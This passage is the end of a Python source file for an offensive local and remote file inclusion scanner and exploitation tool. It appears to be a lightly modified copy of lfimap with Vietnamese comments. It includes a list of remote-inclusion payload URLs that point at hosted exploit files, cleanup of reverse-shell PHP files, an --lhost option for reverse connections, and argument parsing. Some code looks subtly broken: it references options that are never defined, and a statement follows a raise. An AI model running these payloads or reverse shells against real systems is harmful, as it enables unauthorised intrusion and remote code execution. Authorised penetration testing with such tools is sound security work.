        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.php")
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.jsp")
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.html")
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.gif")
    pylds.append(
        "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2Fexploits%2Fexploit.png")

    for pyld in pylds:
        try:
            u, reqHeaders, postTest = prepareRequest(args.param, pyld)
            _, br = REQUEST(u, reqHeaders, postTest,
                            "RFI", False)
            if (not br):
                return
            if (args.quick):
                return
        except:
            pass


def lfimap_cleanup():
    if (os.path.exists(webDir + os.path.sep + "reverse_shell_lin_tmp.php")):
        os.remove(webDir + os.path.sep + "reverse_shell_lin_tmp.php")
    if (os.path.exists(webDir + os.path.sep + "reverse_shell_win_tmp.php")):
        os.remove(webDir + os.path.sep + "reverse_shell_win_tmp.php")

    # Print stats
    print("\n" + '-'*40 + "\nLfimap finished with execution.")
    print("Endpoints tested: " + str(stats["urls"]))

    totalRequests = stats["requests"] + \
        stats["getRequests"] + stats["postRequests"]
    print("Requests sent: " + str(totalRequests))
    print("Vulnerabilities found: " + str(stats["vulns"]))

    # Exit
    os._exit(0)


if (__name__ == "__main__"):
    print(banner_text)
    parser = argparse.ArgumentParser(
        description=" Local File Inclusion discovery and exploitation tool", add_help=False)

    # Add arguments to the parser

    parser.add_argument('-U', type=str, nargs='?', metavar='url', dest='url',
                        help='\t\t Specify url, Ex: "http://example.org/vuln.php?param=PWN"')

    parser.add_argument('-C', type=str, metavar='<cookie>', dest='cookie',
                        help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
    parser.add_argument('-D', type=str, metavar='<data>',
                        dest='postreq', help='\t\t Specify HTTP request form data')
    parser.add_argument('-H', type=str, metavar='<header>', action='append', dest='httpheaders',
                        help='\t\t Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"')
    parser.add_argument('-M', type=str, metavar='<method>', dest='method',
                        help='\t\t Specify HTTP request method to use for testing')

    parser.add_argument('--placeholder', type=str, metavar='<name>', dest='param',
                        help='\t\t Specify different testing placeholder value (default "PWN")')
    parser.add_argument('--delay', type=int, metavar='<milis>', dest='delay',
                        help='\t\t Specify delay in miliseconds after each request')
    parser.add_argument('--http-ok', type=int, action='append', metavar='<number>',
                        dest='http_valid', help='\t\t Specify http response code(s) to treat as valid')
    parser.add_argument('--no-stop', action='store_true', dest='no_stop',
                        help='\t\t Don\'t stop using same method upon findings')
    parser.add_argument('--lhost', type=str, metavar='<lhost>', dest='lhost',
                        help='\t\t Specify local ip address for reverse connection')
    parser.add_argument('-n', type=str, action='append', metavar='<U|B>', dest='encodings',
                        help='\t\t Specify additional payload encoding(s). "U" for URL, "B" for base64')
    parser.add_argument('-q', '--quick', action='store_true',
                              dest='quick', help='\t\t Perform quick testing with few payloads')

    parser.add_argument('--use-long', action='store_true', dest='uselong',
                        help='\t\t Use "wordlists/long.txt" wordlist for truncation test modality')

    parser.add_argument('--log', type=str, metavar='<file>', dest='log',
                        help='\t\t Output all requests and responses to specified file')

    parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
                        help='\t\t Print more detailed output when performing attacks\n')
    parser.add_argument('-h', '--help', action='help',
                        default=argparse.SUPPRESS, help='\t\t Print this help message\n\n')
    # Parse the command-line arguments
    args = parser.parse_args()
    # args.url = "http://localhost:9991/FileInclusion/pages/lvl2.php?file=PWN"
    # #args.f = input("Enter URL file: ")
    # # Specify session cookie, Ex: "PHPSESSID=1943785348b45"'
    # args.cookie = "PHPSESSID=3bb8b36d307f1eceb4c8f4587bb436df"
    # # Chỉ định dữ liệu biểu mẫu yêu cầu HTTP
    # args.postreq = ""
    # # đường dẫn đến tệp ghi log
    # args.log = "/Users/tahai/Documents/Đang Học.../Chuyên đề cơ sở /File_Inclusion/FI/__pycache__/log.txt"
    # args.uselong = True   # or  False để dùng file dài hặc ngắn
    # args.verbose = ""  # In đầu ra chi tiết hơn khi thực hiện các cuộc tấn công
    # args.httpheaders = ""  # thêm vào cho header "X-Forwarded-For:127.0.0.1"
    # args.http_valid = ""  # có chỉ định url mẫu k mã các reponst 200,500,404
    # # Specify different testing placeholder value (default "PWN")'
    # args.param = "PWN"
    # args.delay = ""  # set delay mỗi request
    # args.no_stop = ""  # để dừng việc thực thi tiếp theo
    # args.method = "GET"
    # args.encodings = "U"  # U là base64
    # args.lhost = None
    # args.quick = True

    url = args.url
    truncWordlist = ""  # dùng file khác

    # Check if mandatory args are provided
    if (not args.url):  # kiểm tra tham số url có đc truyền vào không
        print("[-] Mandatory arguments  unspecified. Refer to help menu with help")
        sys.exit(-1)

    if (not args.param):
        args.param = "PWN"

    # if '-D' is provided, set mode to post
    if (args.postreq):
        if (args.param in args.postreq):
            mode = "post"
        else:
            mode = "get"
    # otherwise, set mode to get
    else:
        mode = "get"

    if (not args.method):  # nếu k truyền trc method
        if (args.url):
            if (args.param in args.url):
                args.method = "GET"
        elif (args.postreq):
            if (args.param in args.postreq):
                args.method = "POST"
        else:
            args.method = "GET"

    # Warning if cookie is not provided
    if (not args.cookie):
        print("[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")

    # If testing using GET this checks if provided URL is valid
    urlRegex = re.compile(  # mẫu url
        r'^(?:http|ftp)s?://'  # http:// or https:// or ftp://
        # domain...
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    # kiểm tra url có http và socks không k có thì thêm
    if ("http" not in url and "socks" not in url):
        if (args.verbose):
            print("[i] No URL scheme provided. Defaulting to http.")

        args.url = "http://" + url
        url = "http://" + url

    if (re.match(urlRegex, url) is None):  # để kiểm tra xem url có khớp với mẫu URL hợp lệ hay không
        print("[-] URL not valid, exiting...")
        sys.exit(-1)

    if (scriptDirectory == ""):  # nếu k lâý đc đường dẫn đêns tệp  tin
        separator = ""
    else:
        # os.sep là một hằng số trong module os đại diện cho dấu phân cách thư mục được sử dụng trên hệ điều hành hiện tại (ví dụ: \ trên Windows, / trên Linux).
        separator = os.sep

    # Check if provided trunc wordlist exists

    # tụ cung cấp link đến các mã dễ có lỗi
    if (args.uselong):  # tham số truyền vào dùng gì
        truncWordlist = scriptDirectory + separator + \
            "wordlists" + separator + "long.txt"
    else:
        truncWordlist = scriptDirectory + separator + \
            "wordlists" + separator + "short.txt"
    if ((not os.path.exists(truncWordlist)) and (args.test_all or args.trunc)):
        print("[-] Cannot locate " + truncWordlist +
              " wordlist. Since '-a' or '-t' was specified, lfimap will exit...")
        sys.exit(-1)

    # Check if log file is correct and writeable
    if (args.log):  # kiểm tra file ghi log
        try:
            if (os.path.exists(args.log)):  # kiểm tra xem đã có tệp ghi log chưa
                print("[i] Log destination file '" +
                      args.log + "' already exists")
                users_input = input(
                    "[?] Do you want to continue and append logs to it? Y/n: ")
                if (users_input == "n" and users_input != "N"):  # người dùng có muốn ghi log không
                    print("Exiting...")
                    sys.exit(-1)
                else:
                    print("")
            else:  # chưa có thì Chuẩn bị tệp log để ghi
                if (not os.path.isabs(args.log)):
                    script_dir = os.path.dirname(__file__)
                    rel_path = args.log
                    abs_file_path = os.path.join(script_dir, rel_path)
                else:
                    abs_file_path = args.log
                    print(abs_file_path)
                if (not os.path.isdir(os.path.dirname(os.path.abspath(abs_file_path)))):
                    os.mkdir(os.path.dirname(os.path.abspath(abs_file_path)))
                else:
                    with open(abs_file_path, 'a') as fp:
                        fp.write("-----------START-----------\n")
                        fp.write(
                            "# Starting log: " + str(datetime.now().strftime("%d/%m/%Y %H:%M:%S")) + "\n")
                        fp.write("# Arguments: " + ' '.join(sys.argv) + "\n")
                        fp.write("---------------------------")
                        fp.write("\n\n")
        except:
            raise
            print("[-] Failed creating log file: " + args.log +
                  ". Check if you specified correct path and have correct permissions...")
            sys.exit(-1)

    # Preparing headers
    headers = prepareHeaders()
    if (args.cookie is not None):  # kiểm tra cookie
        addHeader("Cookie", args.cookie)
    if (mode == "post"):  # nếu là post thì add thêm
        addHeader("Content-Type", "application/x-www-form-urlencoded")
    if (args.httpheaders):
        for i in range(len(args.httpheaders)):
            if (":" not in args.httpheaders[i]):
                print("[-] '" + args.httpheaders[i]+"'" +
                      " has no ':' to distinguish parameter name from value. Exiting...")
                sys.exit(-1)
            elif (args.httpheaders[i][0] == ":"):
                print("[-] Header name cannot start with ':' character. Exiting...")
                sys.exit(-1)
            else:
                addHeader(args.httpheaders[i].split(":", 1)[
                          0].strip(), args.httpheaders[i].split(":", 1)[1].lstrip())
    main()
